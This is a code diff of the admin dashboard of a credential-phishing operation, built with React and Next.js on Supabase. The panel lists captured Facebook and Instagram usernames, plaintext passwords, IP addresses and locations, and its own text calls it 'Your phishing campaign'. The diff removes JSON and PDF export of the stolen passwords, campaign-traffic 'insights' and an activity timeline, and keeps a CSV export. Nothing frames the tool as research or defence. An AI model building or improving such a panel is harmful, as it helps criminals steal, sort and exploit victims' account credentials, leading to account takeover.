@@ -2,7 +2,6 @@ import { useState, useEffect } from 'react';
 import { createClient } from '@supabase/supabase-js';
 import { useRouter } from 'next/router';
 import Head from 'next/head';
-import styles from '../styles/admin.module.css';
 
 // Initialize Supabase client
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
@@ -215,65 +214,6 @@ export default function AdminDashboard() {
     document.body.removeChild(link);
   };
   
-  // Add these export functions
-  const exportJSON = () => {
-    const dataStr = JSON.stringify(filterCredentials(), null, 2);
-    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-    
-    const exportFileDefaultName = `credentials-${new Date().toISOString().slice(0,10)}.json`;
-    
-    let linkElement = document.createElement('a');
-    linkElement.setAttribute('href', dataUri);
-    linkElement.setAttribute('download', exportFileDefaultName);
-    linkElement.click();
-  };
-  
-  const exportPDF = async () => {
-    // Using a CDN-loaded library for this example
-    if (!window.jsPDF) {
-      await loadJsPDF();
-    }
-    
-    const doc = new window.jsPDF();
-    
-    // Add title
-    doc.setFontSize(18);
-    doc.text('Credentials Report', 14, 22);
-    
-    // Set up the table
-    const headers = [['Username', 'Password', 'Location', 'IP', 'Date']];
-    
-    const data = filterCredentials().map(cred => [
-      cred.username || '',
-      cred.password || '',
-      `${cred.city || ''}, ${cred.country || ''}`,
-      cred.ip_address || '',
-      new Date(cred.login_time).toLocaleString()
-    ]);
-    
-    doc.autoTable({
-      startY: 30,
-      head: headers,
-      body: data,
-    });
-    
-    doc.save(`credentials-${new Date().toISOString().slice(0,10)}.pdf`);
-  };
-  
-  // Helper to load jsPDF dynamically
-  const loadJsPDF = () => {
-    return new Promise((resolve) => {
-      const script = document.createElement('script');
-      script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
-      script.onload = resolve;
-      document.head.appendChild(script);
-      
-      const autoTableScript = document.createElement('script');
-      autoTableScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.25/jspdf.plugin.autotable.min.js';
-      document.head.appendChild(autoTableScript);
-    });
-  };
-  
   // Fix the platform display section to ensure proper counting
   useEffect(() => {
     async function fetchData() {
@@ -328,93 +268,6 @@ export default function AdminDashboard() {
     
     return credentials.filter(user => user.platform === platform);
   }
-  
-  // Create a component for insights
-  const DashboardInsights = ({ stats }) => {
-    return (
-      <div className={styles.insightsContainer}>
-        <div className={styles.insightCard}>
-          <div className={styles.insightIcon}>
-            <i className="fas fa-chart-line"></i>
-          </div>
-          <div className={styles.insightContent}>
-            <h3>Activity Rate</h3>
-            <p className={styles.insightValue}>
-              {stats.totalEntries > 10 ? 'High' : 'Low'}
-            </p>
-            <p className={styles.insightText}>
-              {stats.totalEntries > 10 
-                ? 'Your phishing campaign is getting good traffic.'
-                : 'Your campaign needs more traffic.'}
-            </p>
-          </div>
-        </div>
-        
-        <div className={styles.insightCard}>
-          <div className={styles.insightIcon}>
-            <i className="fas fa-globe-americas"></i>
-          </div>
-          <div className={styles.insightContent}>
-            <h3>Top Region</h3>
-            <p className={styles.insightValue}>
-              {Object.entries(stats.countries).sort((a, b) => b[1] - a[1])[0]?.[0] || 'N/A'}
-            </p>
-            <p className={styles.insightText}>
-              Most of your entries are from this region.
-            </p>
-          </div>
-        </div>
-        
-        <div className={styles.insightCard}>
-          <div className={styles.insightIcon}>
-            <i className="fas fa-trophy"></i>
-          </div>
-          <div className={styles.insightContent}>
-            <h3>Top Platform</h3>
-            <p className={styles.insightValue}>
-              {stats.instagramEntries > stats.facebookEntries ? 'Instagram' : 'Facebook'}
-            </p>
-            <p className={styles.insightText}>
-              This platform has the highest conversion rate.
-            </p>
-          </div>
-        </div>
-      </div>
-    );
-  };
-  
-  // Add this component
-  const ActivityTimeline = ({ entries }) => {
-    const timelineEntries = entries.slice(0, 8); // Latest 8 entries
-    
-    return (
-      <div className={styles.timelineContainer}>
-        <h3><i className="fas fa-history"></i> Recent Activity</h3>
-        <div className={styles.timeline}>
-          {timelineEntries.map((entry, index) => (
-            <div key={entry.id || index} className={styles.timelineItem} style={{ animationDelay: `${index * 0.1}s` }}>
-              <div className={styles.timelineDot}>
-                {entry.platform?.includes('facebook') || entry.username?.includes('(FB)') ? (
-                  <i className="fab fa-facebook"></i>
-                ) : entry.platform?.includes('instagram') || entry.username?.includes('(IG)') ? (
-                  <i className="fab fa-instagram"></i>
-                ) : (
-                  <i className="fas fa-user"></i>
-                )}
-              </div>
-              <div className={styles.timelineContent}>
-                <h4>{entry.username || 'Unknown user'}</h4>
-                <p>From {entry.country || 'unknown location'} using IP {entry.ip_address || 'unknown'}</p>
-                <span className={styles.timelineDate}>
-                  {new Date(entry.login_time || entry.created_at).toLocaleString()}
-                </span>
-              </div>
-            </div>
-          ))}
-        </div>
-      </div>
-    );
-  };
   
   return (
     <>
@@ -583,17 +436,9 @@ export default function AdminDashboard() {
                         />
                       </div>
                       
-                      <div className={styles.exportOptions}>
-                        <button onClick={exportCSV} className={styles.exportButton}>
-                          <i className="fas fa-file-csv"></i> CSV
-                        </button>
-                        <button onClick={exportJSON} className={styles.exportButton}>
-                          <i className="fas fa-file-code"></i> JSON
-                        </button>
-                        <button onClick={exportPDF} className={styles.exportButton}>
-                          <i className="fas fa-file-pdf"></i> PDF
-                        </button>
-                      </div>
+                      <button className="export-button" onClick={exportCSV}>
+                        <i className="fas fa-download"></i> Export CSV
+                      </button>
                     </div>
                   </div>
                   
@@ -644,9 +489,6 @@ export default function AdminDashboard() {
                     </table>
                   </div>
                 </div>
-                
-                <DashboardInsights stats={stats} />
-                <ActivityTimeline entries={credentials} />
               </>
             )}
           </div>
@@ -1238,156 +1080,6 @@ export default function AdminDashboard() {
         .facebook-logo-container img {
           width: 32px;
           height: 32px;
-        }
-        
-        .insightsContainer {
-          display: grid;
-          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-          gap: 20px;
-          margin: 20px 0;
-        }
-        
-        .insightCard {
-          background: linear-gradient(135deg, #6e8efb, #a777e3);
-          border-radius: 12px;
-          padding: 20px;
-          color: white;
-          display: flex;
-          align-items: center;
-          box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-          transition: transform 0.3s ease, box-shadow 0.3s ease;
-          animation: fadeIn 0.6s ease-out;
-        }
-        
-        .insightCard:hover {
-          transform: translateY(-5px);
-          box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-        }
-        
-        .insightIcon {
-          font-size: 40px;
-          margin-right: 20px;
-          width: 60px;
-          height: 60px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-        }
-        
-        .insightContent h3 {
-          margin: 0 0 5px 0;
-          font-size: 18px;
-          font-weight: 500;
-        }
-        
-        .insightValue {
-          font-size: 26px;
-          font-weight: 700;
-          margin: 0 0 5px 0;
-        }
-        
-        .insightText {
-          font-size: 14px;
-          margin: 0;
-          opacity: 0.9;
-        }
-        
-        @keyframes fadeIn {
-          from { opacity: 0; transform: translateY(10px); }
-          to { opacity: 1; transform: translateY(0); }
-        }
-        
-        body.dark-mode .insightCard {
-          background: linear-gradient(135deg, #38408c, #8a33cc);
-        }
-        
-        .timelineContainer {
-          background-color: white;
-          border-radius: 12px;
-          padding: 20px;
-          margin: 20px 0;
-          box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        
-        body.dark-mode .timelineContainer {
-          background-color: #1e1e1e;
-        }
-        
-        .timeline {
-          position: relative;
-          padding-left: 30px;
-          margin-top: 15px;
-        }
-        
-        .timeline:before {
-          content: '';
-          position: absolute;
-          left: 10px;
-          top: 5px;
-          bottom: 5px;
-          width: 2px;
-          background: #e0e0e0;
-        }
-        
-        body.dark-mode .timeline:before {
-          background: #444;
-        }
-        
-        .timelineItem {
-          position: relative;
-          margin-bottom: 25px;
-          animation: slideIn 0.5s ease-out forwards;
-          opacity: 0;
-          transform: translateX(-10px);
-        }
-        
-        @keyframes slideIn {
-          to { opacity: 1; transform: translateX(0); }
-        }
-        
-        .timelineDot {
-          position: absolute;
-          left: -30px;
-          width: 30px;
-          height: 30px;
-          border-radius: 50%;
-          background: #4a6fb1;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          color: white;
-          z-index: 1;
-        }
-        
-        .timelineContent {
-          background-color: #f9f9f9;
-          padding: 15px;
-          border-radius: 8px;
-          box-shadow: 0 2px 5px rgba(0,0,0,0.08);
-        }
-        
-        body.dark-mode .timelineContent {
-          background-color: #2c2c2c;
-        }
-        
-        .timelineContent h4 {
-          margin: 0 0 5px 0;
-          font-weight: 600;
-        }
-        
-        .timelineContent p {
-          margin: 0 0 5px 0;
-          font-size: 14px;
-        }
-        
-        .timelineDate {
-          font-size: 12px;
-          color: #777;
-          display: block;
-        }
-        
-        body.dark-mode .timelineDate {
-          color: #aaa;
         }
       `}</style>
     </>
